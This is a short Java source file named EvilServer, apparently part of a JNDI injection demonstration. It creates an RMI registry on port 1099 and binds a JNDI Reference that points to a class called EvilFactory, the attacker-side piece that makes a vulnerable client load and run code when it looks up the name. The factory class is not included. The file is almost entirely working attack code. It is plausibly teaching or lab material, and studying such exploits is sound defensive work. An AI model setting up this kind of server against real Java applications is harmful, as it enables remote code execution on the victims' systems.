package JNDIInjection;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;

public class EvilServer {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Context ctx = new InitialContext();
        Reference ref = new Reference(
          "calc",
          "JNDIInjection.EvilFactory", // full restricted!!!
                null
        );
        ctx.rebind("rmi://localhost:1099/remoteObj",ref);

        System.out.println("Evil server is running...");

    }
}
